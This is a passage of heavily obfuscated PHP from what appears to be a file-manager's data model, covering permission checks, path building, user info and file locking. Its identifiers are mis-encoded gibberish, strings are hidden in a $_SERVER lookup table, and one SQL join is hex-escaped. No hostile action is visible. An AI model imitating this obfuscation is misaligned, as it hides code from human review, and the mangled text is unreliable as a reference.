$ˆÓš‡’á[$°Ïäòë·[87]][$°Ïäòë·[481]] = $®æ¢ÕëŸ[$ˆÓš‡’á[$°Ïäòë·[402]]][$°Ïäòë·[32]]; } if ($Ùœû’ÃÙ && $¾â¥¦Ê && isset($Ùœû’ÃÙ[$ˆÓš‡’á[$°Ïäòë·[402]]])) { $ˆÓš‡’á[$°Ïäòë·[87]][$°Ïäòë·[482]] = array(); foreach ($Ùœû’ÃÙ[$ˆÓš‡’á[$°Ïäòë·[402]]] as $Œ‘˜¦ĞÎ) { $¼Ú¼ö¡ô = $¾â¥¦Ê[$Œ‘˜¦ĞÎ]; $ˆÓš‡’á[$°Ïäòë·[87]][$°Ïäòë·[482]][] = array($°Ïäòë·[483] => $¼Ú¼ö¡ô[$°Ïäòë·[399]], $°Ïäòë·[420] => $¼Ú¼ö¡ô[$°Ïäòë·[32]], $°Ïäòë·[484] => $¼Ú¼ö¡ô[$°Ïäòë·[485]]); } } if ($Ó¨’Á && isset($Ó¨’Á[$ˆÓš‡’á[$°Ïäòë·[402]]])) { $ˆÓš‡’á[$°Ïäòë·[87]][$°Ïäòë·[486]] = array(); foreach ($Ó¨’Á[$ˆÓš‡’á[$°Ïäòë·[402]]] as $‘ÕµÆ¨Ï) { $å†Í’ê = $°Ïäòë·[487]; if ($‘ÕµÆ¨Ï[$°Ïäòë·[488]] == $°Ïäòë·[88]) { $å†Í’ê .= $°Ïäòë·[489]; } $ˆÓš‡’á[$°Ïäòë·[87]][$°Ïäòë·[486]] = array_field_key($‘ÕµÆ¨Ï, explode($°Ïäòë·[50], $å†Í’ê)); } } } unset($ˆÓš‡’á); return $§ıº÷ı; } protected function _listAppendChildren(&$ş¬ÔÁü„, $¨µ¾Ì‘Õ) { $Åò½ÃÅ™ =& $_SERVER[å¸¿•¶£]; $ã Î®ˆ¢ = array(); $ğ¼ëûÊû = array($Åò½ÃÅ™[207] => 0, $Åò½ÃÅ™[208] => 0); foreach ($ş¬ÔÁü„ as &$ÆšªòÛ£) { if (!$ÆšªòÛ£[$Åò½ÃÅ™[410]]) { continue; } $ã Î®ˆ¢[] = $ÆšªòÛ£[$Åò½ÃÅ™[402]]; } unset($ÆšªòÛ£); if (!$ã Î®ˆ¢) { return; } $ŒÒú¦ì = array($Åò½ÃÅ™[432] => array($Åò½ÃÅ™[7], $ã Î®ˆ¢), $Åò½ÃÅ™[431] => 0); $óÕÃÇû° = array($Åò½ÃÅ™[432], $Åò½ÃÅ™[410], $Åò½ÃÅ™[490] => $Åò½ÃÅ™[491]); $¸”ŠÇ÷ = $this->field($óÕÃÇû°)->where($ŒÒú¦ì)->group($Åò½ÃÅ™[492])->select(); $ñôıÃô· = array(); foreach ($¸”ŠÇ÷ as $±Œ¬) { $‹ºç…¼ = $±Œ¬[$Åò½ÃÅ™[432]]; $Å¤Úüß« = $±Œ¬[$Åò½ÃÅ™[410]] == $Åò½ÃÅ™[88] ? $Åò½ÃÅ™[208] : $Åò½ÃÅ™[207]; if (!isset($ñôıÃô·[$‹ºç…¼])) { $ñôıÃô·[$‹ºç…¼] = array($Åò½ÃÅ™[207] => 0, $Åò½ÃÅ™[208] => 0); } $ñôıÃô·[$‹ºç…¼][$Å¤Úüß«] += $±Œ¬[$Åò½ÃÅ™[491]]; } foreach ($ş¬ÔÁü„ as &$ÆšªòÛ£) { if (!$ÆšªòÛ£[$Åò½ÃÅ™[410]]) { continue; } $ßùéÅÖ = is_array($ñôıÃô·[$ÆšªòÛ£[$Åò½ÃÅ™[402]]]) ? $ñôıÃô·[$ÆšªòÛ£[$Åò½ÃÅ™[402]]] : $ğ¼ëûÊû; $ÆšªòÛ£[$Åò½ÃÅ™[208]] = $ßùéÅÖ[$Åò½ÃÅ™[208]]; $ÆšªòÛ£[$Åò½ÃÅ™[207]] = $ßùéÅÖ[$Åò½ÃÅ™[207]]; unset($ÆšªòÛ£[$Åò½ÃÅ™[412]]); } unset($ÆšªòÛ£); } protected function _listAppendAuth(&$’××Ëæ ) { $»ş± ó¾ =& $_SERVER[å¸¿•¶£]; $›ò¤¼áÃ = array(); foreach ($’××Ëæ  as $õ¤ß›Ÿí) { if ($õ¤ß›Ÿí[$»ş± ó¾[411]] == self::TYPE_GROUP) { $›ò¤¼áÃ[] = $õ¤ß›Ÿí[$»ş± ó¾[402]]; } } if (!$›ò¤¼áÃ) { return; } $½Â§Šãâ = array_to_keyvalue($’××Ëæ , $»ş± ó¾[402]); $±ªÌ™Éë = Model($»ş± ó¾[493])->getSourceList($›ò¤¼áÃ, $½Â§Šãâ); $Îœ–¼€Ó = $GLOBALS[$»ş± ó¾[494]] == 1; foreach ($’××Ëæ  as $ëÒ†³¨² => &$õ¤ß›Ÿí) { $õ¤ß›Ÿí[$»ş± ó¾[413]] = $±ªÌ™Éë[$õ¤ß›Ÿí[$»ş± ó¾[402]]]; if (!$õ¤ß›Ÿí[$»ş± ó¾[413]] && $õ¤ß›Ÿí[$»ş± ó¾[411]] == self::TYPE_GROUP) { $õ¤ß›Ÿí[$»ş± ó¾[413]] = Action($»ş± ó¾[495])->pathGroupAuthMake($õ¤ß›Ÿí[$»ş± ó¾[496]]); if (!$õ¤ß›Ÿí[$»ş± ó¾[413]] && !$Îœ–¼€Ó) { $õ¤ß›Ÿí[$»ş± ó¾[203]] = !1; $õ¤ß›Ÿí[$»ş± ó¾[202]] = !1; } } if ($õ¤ß›Ÿí[$»ş± ó¾[413]]) { $õ¤ß›Ÿí[$»ş± ó¾[203]] = AuthModel::authCheckEdit($õ¤ß›Ÿí[$»ş± ó¾[413]][$»ş± ó¾[414]]); $õ¤ß›Ÿí[$»ş± ó¾[202]] = AuthModel::authCheckView($õ¤ß›Ÿí[$»ş± ó¾[413]][$»ş± ó¾[414]]); } $this->groupPathDisplay($õ¤ß›Ÿí); } unset($õ¤ß›Ÿí); } public function _listAppendAuthSecret(&$ã¾úÈòø) { $õûíœîê =& $_SERVER[å¸¿•¶£]; if (Model($õûíœîê[435])->get($õûíœîê[497]) != $õûíœîê[88]) { return; } static $šş±Ş·† = false; if (!$šş±Ş·†) { $¤«ÚŒ¯è = Model($õûíœîê[498]); $‰ç®§À = Model($õûíœîê[499]); $šş±Ş·† = $‰ç®§À->listData(); $šş±Ş·† = array_to_keyvalue($šş±Ş·†, $õûíœîê[402]); $™óıİø¤ = json_decode(Model($õûíœîê[435])->get($õûíœîê[500]), !0); $™óıİø¤ = array_to_keyvalue($™óıİø¤, $õûíœîê[399]); foreach ($šş±Ş·† as $Õõ¨ú– => $Çå¨øã¸) { $Òüèü§ = $™óıİø¤[$Çå¨øã¸[$õûíœîê[501]]]; if (!$Òüèü§) { $‰ç®§À->remove($Çå¨øã¸[$õûíœîê[399]]); unset($šş±Ş·†[$Õõ¨ú–]); continue; } $¢ßĞâ®é = $¤«ÚŒ¯è->listData($Òüèü§[$õûíœîê[413]]); if (!$¢ßĞâ®é) { $‰ç®§À->remove($Çå¨øã¸[$õûíœîê[399]]); unset($šş±Ş·†[$Õõ¨ú–]); continue; } $Çå¨øã¸[$õûíœîê[413]] = $¢ßĞâ®é; $Çå¨øã¸[$õûíœîê[502]] = $Òüèü§; $Çå¨øã¸[$õûíœîê[503]] = Model($õûíœîê[504])->getInfoSimpleOuter($Çå¨øã¸[$õûíœîê[454]]); $šş±Ş·†[$Õõ¨ú–] = $Çå¨øã¸; } } $Ô˜»¬ƒè = USER_ID; $ëòûÜ¯¿ = array(); $°Öğºñü = $this->_listAppendPath($ëòûÜ¯¿, !0); foreach ($ã¾úÈòø as $Õõ¨ú– => &$Çå¨øã¸) { if (!is_array($Çå¨øã¸[$õûíœîê[413]])) { continue; } if ($Çå¨øã¸[$õûíœîê[411]] != $õûíœîê[505]) { continue; } if (isset($šş±Ş·†[$Çå¨øã¸[$õûíœîê[402]]])) { $¹‹¹¼Áß = $šş±Ş·†[$Çå¨øã¸[$õûíœîê[402]]]; if (!is_array($Çå¨øã¸[$õûíœîê[466]])) { $Çå¨øã¸[$õûíœîê[466]] = array(); } $Çå¨øã¸[$õûíœîê[466]][$õûíœîê[506]] = $¹‹¹¼Áß[$õûíœîê[501]]; $Çå¨øã¸[$õûíœîê[413]][$õûíœîê[507]] = $¹‹¹¼Áß; $Çå¨øã¸[$õûíœîê[413]][$õûíœîê[508]] = $Çå¨øã¸[$õûíœîê[509]]; $Çå¨øã¸[$õûíœîê[413]][$õûíœîê[510]] = $õûíœîê[88]; if ($¹‹¹¼Áß[$õûíœîê[454]] != $Ô˜»¬ƒè) { $Çå¨øã¸[$õûíœîê[413]][$õûíœîê[414]] = $Çå¨øã¸[$õûíœîê[413]][$õûíœîê[414]] & $¹‹¹¼Áß[$õûíœîê[413]][$õûíœîê[413]]; } continue; } $•ú·£èû = $this->parentLevelArray($Çå¨øã¸[$õûíœîê[511]]); $»ê·Í’˜ = array_reverse($•ú·£èû); foreach ($»ê·Í’˜ as $¹‰áŸÍ => $œø®ãÀ) { if (!isset($šş±Ş·†[$œø®ãÀ])) { continue; } $¹‹¹¼Áß = $šş±Ş·†[$œø®ãÀ]; $Çå¨øã¸[$õûíœîê[413]][$õûíœîê[507]] = $¹‹¹¼Áß; if ($¹‹¹¼Áß[$õûíœîê[454]] != $Ô˜»¬ƒè) { $Çå¨øã¸[$õûíœîê[413]][$õûíœîê[414]] = $Çå¨øã¸[$õûíœîê[413]][$õûíœîê[414]] & $¹‹¹¼Áß[$õûíœîê[413]][$õûíœîê[413]]; } $ÏúòÜø = $õûíœîê[12]; $÷ï¥Åî¢ = count($•ú·£èû) - $¹‰áŸÍ; for ($¿ğä¼“Ó = 0; $¿ğä¼“Ó < $÷ï¥Åî¢; $¿ğä¼“Ó++) { if (!isset($°Öğºñü[$•ú·£èû[$¿ğä¼“Ó]])) { $ÏúòÜø = $õûíœîê[12]; break; } $ÏúòÜø = $ÏúòÜø . rtrim($°Öğºñü[$•ú·£èû[$¿ğä¼“Ó]], $õûíœîê[8]) . $õûíœîê[8]; } $Çå¨øã¸[$õûíœîê[413]][$õûíœîê[508]] = rtrim($ÏúòÜø, $õûíœîê[8]) . $õûíœîê[8]; break; } } unset($Çå¨øã¸); } public function groupPathDisplay(&$±­¼¤¥è) { $ôŸÇ£¦ =& $_SERVER[å¸¿•¶£]; if ($±­¼¤¥è[$ôŸÇ£¦[411]] != self::TYPE_GROUP) { return; } $…Ò¼à¦Õ = Model($ôŸÇ£¦[512])->getInfo($±­¼¤¥è[$ôŸÇ£¦[496]]); $º©éõ’Œ = $this->parentLevelArray($…Ò¼à¦Õ[$ôŸÇ£¦[511]]); $È™Ñê‘É = $ôŸÇ£¦[12]; foreach ($º©éõ’Œ as $è³Ø°í) { $ï€éşíà = Model($ôŸÇ£¦[512])->getInfo($è³Ø°í); $È™Ñê‘É .= $ï€éşíà[$ôŸÇ£¦[87]][$ôŸÇ£¦[402]] . $ôŸÇ£¦[50]; } $±­¼¤¥è[$ôŸÇ£¦[513]] = $…Ò¼à¦Õ[$ôŸÇ£¦[432]]; $±­¼¤¥è[$ôŸÇ£¦[514]] = $…Ò¼à¦Õ[$ôŸÇ£¦[511]]; $±­¼¤¥è[$ôŸÇ£¦[515]] = $…Ò¼à¦Õ[$ôŸÇ£¦[516]]; $±­¼¤¥è[$ôŸÇ£¦[517]] = $È™Ñê‘É . $…Ò¼à¦Õ[$ôŸÇ£¦[87]][$ôŸÇ£¦[402]]; } protected function _listAppendPath(&$şÔ÷…Î·, $À¯È‚Ûª = false) { $×Üî÷É´ =& $_SERVER[å¸¿•¶£]; static $õ’ŞÌ¿ = array(); $â¤ğŒÖ = array(); $â²‡ñ˜ = array(); if ($À¯È‚Ûª) { return $õ’ŞÌ¿; } foreach ($şÔ÷…Î· as &$úîÂÚ˜˜) { $ÅÇ„ã—§ = $úîÂÚ˜˜[$×Üî÷É´[402]]; if ($úîÂÚ˜˜[$×Üî÷É´[410]] == $×Üî÷É´[88] && $úîÂÚ˜˜[$×Üî÷É´[432]] != 0) { $õ’ŞÌ¿[$ÅÇ„ã—§] = $úîÂÚ˜˜[$×Üî÷É´[32]]; } if ($úîÂÚ˜˜[$×Üî÷É´[410]] == $×Üî÷É´[88] && $úîÂÚ˜˜[$×Üî÷É´[432]] == 0 && !isset($õ’ŞÌ¿[$ÅÇ„ã—§])) { $õ’ŞÌ¿[$ÅÇ„ã—§] = $this->_listAppendPathRoot($úîÂÚ˜˜, array()); } if (isset($â²‡ñ˜[$úîÂÚ˜˜[$×Üî÷É´[511]]])) { continue; } $â²‡ñ˜[$úîÂÚ˜˜[$×Üî÷É´[511]]] = !0; $ßã¤•Ú = $this->parentLevelArray($úîÂÚ˜˜[$×Üî÷É´[511]]); foreach ($ßã¤•Ú as $ùğÇÕû£ => $º¢ÙÇû¼) { if (isset($õ’ŞÌ¿[$º¢ÙÇû¼])) { continue; } if ($ùğÇÕû£ == 0) { $õ’ŞÌ¿[$º¢ÙÇû¼] = $this->_listAppendPathRoot($úîÂÚ˜˜, $ßã¤•Ú); } if ($ùğÇÕû£ != 0) { $â¤ğŒÖ[] = $º¢ÙÇû¼; } } } unset($úîÂÚ˜˜); $â¤ğŒÖ = array_unique($â¤ğŒÖ); if (count($â¤ğŒÖ) > 0) { $®Øëäêù = array($×Üî÷É´[417] => array($×Üî÷É´[418], $â¤ğŒÖ)); if (count($â¤ğŒÖ) == 1) { $ö‘ÒÇÏÈ = $this->sourceInfo($â¤ğŒÖ[0]); $µŸİ®½ = is_array($ö‘ÒÇÏÈ) ? array($ö‘ÒÇÏÈ) : !1; } else { $µŸİ®½ = $this->field($×Üî÷É´[518])->where($®Øëäêù)->select(); } if (!$µŸİ®½) { $µŸİ®½ = array(); } foreach ($µŸİ®½ as $ì»‚¯Ş˜) { $õ’ŞÌ¿[$ì»‚¯Ş˜[$×Üî÷É´[402]]] = $ì»‚¯Ş˜[$×Üî÷É´[32]]; } } $ÌóÃÚĞ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ˆúíì³Å = array(); foreach ($şÔ÷…Î· as &$úîÂÚ˜˜) { $ÀÊÀ‹Š = $úîÂÚ˜˜[$×Üî÷É´[511]]; $œ“ÛÉ»« = $×Üî÷É´[12]; if (isset($ˆúíì³Å[$ÀÊÀ‹Š])) { $œ“ÛÉ»« = $ˆúíì³Å[$ÀÊÀ‹Š]; } else { $ßã¤•Ú = $this->parentLevelArray($úîÂÚ˜˜[$×Üî÷É´[511]]); foreach ($ßã¤•Ú as $ùğÇÕû£ => $º¢ÙÇû¼) { if (isset($õ’ŞÌ¿[$º¢ÙÇû¼])) { $œ“ÛÉ»« .= $õ’ŞÌ¿[$º¢ÙÇû¼] . $×Üî÷É´[8]; } } $ˆúíì³Å[$ÀÊÀ‹Š] = $œ“ÛÉ»«; } $œ“ÛÉ»« .= $úîÂÚ˜˜[$×Üî÷É´[32]]; if ($úîÂÚ˜˜[$×Üî÷É´[410]] == $×Üî÷É´[88]) { $œ“ÛÉ»« .= $×Üî÷É´[8]; } $úîÂÚ˜˜[$×Üî÷É´[509]] = str_replace($×Üî÷É´[519], $×Üî÷É´[8], $œ“ÛÉ»«); if ($úîÂÚ˜˜[$×Üî÷É´[432]] == $×Üî÷É´[198]) { $úîÂÚ˜˜[$×Üî÷É´[32]] = trim($õ’ŞÌ¿[$úîÂÚ˜˜[$×Üî÷É´[402]]], $×Üî÷É´[8]); $úîÂÚ˜˜[$×Üî÷É´[509]] = $úîÂÚ˜˜[$×Üî÷É´[32]] . $×Üî÷É´[8]; } if (intval($úîÂÚ˜˜[$×Üî÷É´[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($úîÂÚ˜˜, $ßã¤•Ú, $ÌóÃÚĞ); } } unset($úîÂÚ˜˜); return $şÔ÷…Î·; } private function _listAppendPathRecycle(&$‹¾”­÷, $èö‰¾±, $Á†µ¬Üİ) { $©ÙŞ«§Å =& $_SERVER[å¸¿•¶£]; if (!in_array($Á†µ¬Üİ, $èö‰¾±) && $‹¾”­÷[$©ÙŞ«§Å[402]] != $Á†µ¬Üİ) { return; } $ˆÜú²œ÷ = explode($©ÙŞ«§Å[8], trim($‹¾”­÷[$©ÙŞ«§Å[509]], $©ÙŞ«§Å[8])); $¤¥á¯Ø = implode($©ÙŞ«§Å[8], array_slice($ˆÜú²œ÷, 2)); $‹¾”­÷[$©ÙŞ«§Å[509]] = $©ÙŞ«§Å[8] . LNG($©ÙŞ«§Å[520]) . $©ÙŞ«§Å[8] . ltrim($¤¥á¯Ø, $©ÙŞ«§Å[8]); $‹¾”­÷[$©ÙŞ«§Å[511]] = $©ÙŞ«§Å[521] . implode($©ÙŞ«§Å[50], array_slice($èö‰¾±, 1)) . $©ÙŞ«§Å[50]; if ($‹¾”­÷[$©ÙŞ«§Å[402]] == $Á†µ¬Üİ) { $‹¾”­÷[$©ÙŞ«§Å[511]] = $©ÙŞ«§Å[521]; $‹¾”­÷[$©ÙŞ«§Å[432]] = $©ÙŞ«§Å[198]; $‹¾”­÷[$©ÙŞ«§Å[32]] = LNG($©ÙŞ«§Å[520]); } $‹¾”­÷[$©ÙŞ«§Å[522]] = $©ÙŞ«§Å[523]; } protected function _listAppendPathRoot(&$¦€Ã§¢‡, $Ã’¾‰ÄÌ) { $ñÀĞˆ¢ =& $_SERVER[å¸¿•¶£]; static $Êì©ì¦´ = false; $ş±¶ÓÊŸ = $ñÀĞˆ¢[12]; if ($¦€Ã§¢‡[$ñÀĞˆ¢[411]] == self::TYPE_USER) { if ($¦€Ã§¢‡[$ñÀĞˆ¢[496]] == USER_ID) { $ş±¶ÓÊŸ = LNG($ñÀĞˆ¢[524]); if ($Êì©ì¦´ === !1) { $µ±ğé‘‹ = Model($ñÀĞˆ¢[525])->getInfoFull(USER_ID); $Êì©ì¦´ = _get($µ±ğé‘‹, $ñÀĞˆ¢[526], $ñÀĞˆ¢[12]); } if ($Ã’¾‰ÄÌ && $Ã’¾‰ÄÌ[0] == $Êì©ì¦´ || !$Ã’¾‰ÄÌ && $¦€Ã§¢‡[$ñÀĞˆ¢[402]] == $Êì©ì¦´) { $ş±¶ÓÊŸ = LNG($ñÀĞˆ¢[527]); $¦€Ã§¢‡[$ñÀĞˆ¢[528]] = $ñÀĞˆ¢[529]; } if (!$Ã’¾‰ÄÌ) { $¦€Ã§¢‡[$ñÀĞˆ¢[32]] = $ş±¶ÓÊŸ; } } else { $‡Öş¦¹ø = Model($ñÀĞˆ¢[504])->getInfoSimple($¦€Ã§¢‡[$ñÀĞˆ¢[496]]); $ş±¶ÓÊŸ = LNG($ñÀĞˆ¢[530]) . $ñÀĞˆ¢[162] . $‡Öş¦¹ø[$ñÀĞˆ¢[32]] . $ñÀĞˆ¢[164]; $¦€Ã§¢‡[$ñÀĞˆ¢[531]] = array($ñÀĞˆ¢[32] => $‡Öş¦¹ø[$ñÀĞˆ¢[32]], $ñÀĞˆ¢[532] => $‡Öş¦¹ø[$ñÀĞˆ¢[532]], $ñÀĞˆ¢[533] => $‡Öş¦¹ø[$ñÀĞˆ¢[533]]); } } else { if ($¦€Ã§¢‡[$ñÀĞˆ¢[411]] == self::TYPE_GROUP) { $‡Öş¦¹ø = Model($ñÀĞˆ¢[512])->getInfoSimple($¦€Ã§¢‡[$ñÀĞˆ¢[496]]); $ş±¶ÓÊŸ = $‡Öş¦¹ø[$ñÀĞˆ¢[32]]; } else { if ($¦€Ã§¢‡[$ñÀĞˆ¢[411]] == self::TYPE_SYSTEM) { $ş±¶ÓÊŸ = $ñÀĞˆ¢[534]; } } } $ş±¶ÓÊŸ = $ş±¶ÓÊŸ ? $ñÀĞˆ¢[8] . $ş±¶ÓÊŸ . $ñÀĞˆ¢[8] : $ñÀĞˆ¢[8]; return $ş±¶ÓÊŸ; } protected function _listAppendUser(&$¯¦Ä®) { $§äÏâı­ =& $_SERVER[å¸¿•¶£]; $§›óÓß’ = array_to_keyvalue($¯¦Ä®, $§äÏâı­[12], $§äÏâı­[454]); $ëÌ—ˆ¦Ÿ = array_to_keyvalue($¯¦Ä®, $§äÏâı­[12], $§äÏâı­[456]); $„Òµé¦½ = array_merge($§›óÓß’, $ëÌ—ˆ¦Ÿ); $›çÇ¹¯ = Model($§äÏâı­[525])->userListInfo($„Òµé¦½); foreach ($¯¦Ä® as &$ïº¨’ƒ›) { $ş³ª×Íô = $ïº¨’ƒ›[$§äÏâı­[454]]; $ïº¨’ƒ›[$§äÏâı­[454]] = $›çÇ¹¯[$ş³ª×Íô] ? $›çÇ¹¯[$ş³ª×Íô] : !1; $ş³ª×Íô = $ïº¨’ƒ›[$§äÏâı­[456]]; $ïº¨’ƒ›[$§äÏâı­[456]] = $›çÇ¹¯[$ş³ª×Íô] ? $›çÇ¹¯[$ş³ª×Íô] : !1; if (isset($ïº¨’ƒ›[$§äÏâı­[466]]) && $ïº¨’ƒ›[$§äÏâı­[466]][$§äÏâı­[535]]) { $Ò­˜±˜“ = $GLOBALS[$§äÏâı­[6]][$§äÏâı­[89]][$§äÏâı­[536]]; if ($ïº¨’ƒ›[$§äÏâı­[466]][$§äÏâı­[537]] <= time() - $Ò­˜±˜“) { $this->metaSet($ïº¨’ƒ›[$§äÏâı­[402]], $§äÏâı­[535], null); $this->metaSet($ïº¨’ƒ›[$§äÏâı­[402]], $§äÏâı­[537], null); unset($ïº¨’ƒ›[$§äÏâı­[466]][$§äÏâı­[535]]); continue; } $Çïğ¿ƒ™ = $ïº¨’ƒ›[$§äÏâı­[466]][$§äÏâı­[535]]; $ïº¨’ƒ›[$§äÏâı­[466]][$§äÏâı­[538]] = Model($§äÏâı­[525])->getInfoSimpleOuter($Çïğ¿ƒ™); } } unset($ïº¨’ƒ›); } public function parentLevelArray($Šşòîáú) { $Şá¶°Ï =& $_SERVER[å¸¿•¶£]; $Šşòîáú = explode($Şá¶°Ï[50], trim($Šşòîáú, $Şá¶°Ï[50])); return array_remove_value($Šşòîáú, $Şá¶°Ï[198]); } public function listAll($®­ÏÈÓš) { $Û ŠÛñ =& $_SERVER[å¸¿•¶£]; $Ü—À×ÏÃ = $this->sourceInfo($®­ÏÈÓš); $ãµ¯¥¤É = array($Û ŠÛñ[539] => array($Û ŠÛñ[540], $Ü—À×ÏÃ[$Û ŠÛñ[511]] . $®­ÏÈÓš . $Û ŠÛñ[541]), $Û ŠÛñ[542] => 0); $«„‹ïÕµ = $Û ŠÛñ[543]; $“…Ãèôº = "\x4c\105\106\x54\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\146\151\154\145\x20\146\x69\x6c\145\40\x6f\156\40\x73\157\165\162\143\145\56\146\x69\154\x65\x49\104\x20\75\40\146\x69\154\x65\x2e\146\151\x6c\145\111\104"; $ÔÌ„ŒÛ¥ = $this->alias($Û ŠÛñ[446])->field($«„‹ïÕµ)->where($ãµ¯¥¤É)->join($“…Ãèôº)->select(); $this->_listAppendAuth($ÔÌ„ŒÛ¥); $this->_listAppendUser($ÔÌ„ŒÛ¥); $this->_listAppendPath($ÔÌ„ŒÛ¥); $ÔÌ„ŒÛ¥ = array_to_keyvalue($ÔÌ„ŒÛ¥, $Û ŠÛñ[402]); $Ø»Ê’úÔ = "\57{$Ü—À×ÏÃ[$Û ŠÛñ[32]]}\x2f"; $Ø»Ê’úÔ = $Ø»Ê’úÔ == $Û ŠÛñ[519] ? $Û ŠÛñ[8] : $Ø»Ê’úÔ; $…šü½»æ = array(); foreach ($ÔÌ„ŒÛ¥ as $¶äûêŸ© => $Åù›Ô¦¨) { $–±Æ“€• = $this->parentLevelArray($Åù›Ô¦¨[$Û ŠÛñ[511]]); array_shift($–±Æ“€•); $¨©ÅŠ—ì = $Ø»Ê’úÔ; for ($‘èª¾ä  = 0; $‘èª¾ä  < count($–±Æ“€•); $‘èª¾ä ++) { $¨©ÅŠ—ì .= $ÔÌ„ŒÛ¥[$–±Æ“€•[$‘èª¾ä ]][$Û ŠÛñ[32]] . $Û ŠÛñ[8]; } $¨©ÅŠ—ì .= $Åù›Ô¦¨[$Û ŠÛñ[32]]; if ($Åù›Ô¦¨[$Û ŠÛñ[410]]) { $¨©ÅŠ—ì .= $Û ŠÛñ[8]; } $„üòÁÒÑ = array($Û ŠÛñ[421] => str_replace($Û ŠÛñ[519], $Û ŠÛñ[8], str_replace($Û ŠÛñ[519], $Û ŠÛñ[8], str_replace($Û ŠÛñ[519], $Û ŠÛñ[8], $¨©ÅŠ—ì))), $Û ŠÛñ[544] => intval($Åù›Ô¦¨[$Û ŠÛñ[410]]), $Û ŠÛñ[545] => intval($Åù›Ô¦¨[$Û ŠÛñ[76]]), $Û ŠÛñ[85] => intval($Åù›Ô¦¨[$Û ŠÛñ[85]]), $Û ŠÛñ[87] => $this->pathInfoFilter($Åù›Ô¦¨)); if (!$„üòÁÒÑ[$Û ŠÛñ[410]]) { $„üòÁÒÑ[$Û ŠÛñ[468]] = $Åù›Ô¦¨[$Û ŠÛñ[468]]; } $…šü½»æ[] = $„üòÁÒÑ; } $…šü½»æ = array_sort_by($…šü½»æ, $Û ŠÛñ[84]); return $…šü½»æ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Áò‰Áå) { $š„…Øú =& $_SERVER[å¸¿•¶£]; if (!$this->allowLock()) { return; } $this->_lockCheck($š„…Øú[546], $Áò‰Áå); $»”ıˆ ü = 1; $this->_lockEvent($Áò‰Áå, array($š„…Øú[547], $š„…Øú[548]), $»”ıˆ ü); $this->_lockParent($Áò‰Áå, array($š„…Øú[548]), $»”ıˆ ü); $this->_lockEvent($Áò‰Áå, array($š„…Øú[549], $š„…Øú[550]), $»”ıˆ ü); $this->_lockCheckEnd($š„…Øú[546], $Áò‰Áå); } public function lockCopyEnd($ÖÓÃâØ°) { $œ¤–•ŞŞ =& $_SERVER[å¸¿•¶£]; if (!$this->allowLock()) { return; } $½šĞáßØ = 0; $this->_lockEvent($ÖÓÃâØ°, array($œ¤–•ŞŞ[547], $œ¤–•ŞŞ[548]), $½šĞáßØ); $this->_lockParent($ÖÓÃâØ°, array($œ¤–•ŞŞ[548]), $½šĞáßØ); $this->_lockEvent($ÖÓÃâØ°, array($œ¤–•ŞŞ[549], $œ¤–•ŞŞ[550]), $½šĞáßØ); } public function lockWriteStart($ØºÄŞ¤¡, $–¥™»¡® = '') { $¹Œì¢È÷ =& $_SERVER[å¸¿•¶£]; if (!$this->allowLock()) { return; } $this->_lockCheck($¹Œì¢È÷[547], $ØºÄŞ¤¡); $ç÷é•ü = 1; $this->_lockKey($¹Œì¢È÷[551] . $ØºÄŞ¤¡ . $¹Œì¢È÷[10] . $–¥™»¡®, $ç÷é•ü); $this->_lockEvent($ØºÄŞ¤¡, array($¹Œì¢È÷[546], $¹Œì¢È÷[548]), $ç÷é•ü); $this->_lockParent($ØºÄŞ¤¡, array($¹Œì¢È÷[546], $¹Œì¢È÷[548]), $ç÷é•ü); $this->_lockCheckEnd($¹Œì¢È÷[547], $ØºÄŞ¤¡); } public function lockWriteEnd($“ó¦€‰, $—€…„ù = '') { $íªØ¡ÕÀ =& $_SERVER[å¸¿•¶£]; if (!$this->allowLock()) { return; } $Â»ÚĞË¿ = 0; $this->_lockKey($íªØ¡ÕÀ[551] . $“ó¦€‰ . $íªØ¡ÕÀ[10] . $—€…„ù, $Â»ÚĞË¿); $this->_lockEvent($“ó¦€‰, array($íªØ¡ÕÀ[546], $íªØ¡ÕÀ[548]), $Â»ÚĞË¿); $this->_lockParent($“ó¦€‰, array($íªØ¡ÕÀ[546], $íªØ¡ÕÀ[548]), $Â»ÚĞË¿); } public function lockMoveStart($“Åè–Ğ) { $‡ÍñÏ‚… =& $_SERVER[å¸¿•¶£]; if (!$this->allowLock()) { return; } $this->_lockCheck($‡ÍñÏ‚…[548], $“Åè–Ğ); $Œ¤ËÏ­Û = 1; $this->_lockKey($‡ÍñÏ‚…[552] . $“Åè–Ğ, $Œ¤ËÏ­Û); $this->_lockEvent($“Åè–Ğ, array($‡ÍñÏ‚…[546], $‡ÍñÏ‚…[547]), $Œ¤ËÏ­Û); $this->_lockParent($“Åè–Ğ, array($‡ÍñÏ‚…[546], $‡ÍñÏ‚…[548]), $Œ¤ËÏ­Û); $this->_lockEvent($“Åè–Ğ, array($‡ÍñÏ‚…[553], $‡ÍñÏ‚…[549], $‡ÍñÏ‚…[550]), $Œ¤ËÏ­Û); $this->_lockCheckEnd($‡ÍñÏ‚…[548], $“Åè–Ğ); } public function lockMoveEnd($ÄãÌ¼°§) { $­Î¹ İ =& $_SERVER[å¸¿•¶£]; if (!$this->allowLock()) { return; } $ÛÚÏÅ„˜ = 0; $this->_lockKey($­Î¹ İ[552] . $ÄãÌ¼°§, $ÛÚÏÅ„˜); $this->_lockEvent($ÄãÌ¼°§, array($­Î¹ İ[546], $­Î¹ İ[547]), $ÛÚÏÅ„˜); $this->_lockParent($ÄãÌ¼°§, array($­Î¹ İ[546], $­Î¹ İ[548]), $ÛÚÏÅ„˜); $this->_lockEvent($ÄãÌ¼°§, array($­Î¹ İ[553], $­Î¹ İ[549], $­Î¹ İ[550]), $ÛÚÏÅ„˜); } private function _lockCheck($ŠÏ‰ä„Ñ, $Ü‚¶¤´) { $£Ÿ±¯ÖÒ =& $_SERVER[å¸¿•¶£]; $îÅ¸’Ì = $this->sourceInfo($Ü‚¶¤´); $£…Ôıİç = $ŠÏ‰ä„Ñ . $£Ÿ±¯ÖÒ[10] . $Ü‚¶¤´; $this->_lockTimeStart[$£…Ôıİç] = timeFloat(); if (!is_array($îÅ¸’Ì)) { return; } $…âõÁ’ = LNG($£Ÿ±¯ÖÒ[554]); CacheLock::setErrorMsg($£Ÿ±¯ÖÒ[162] . 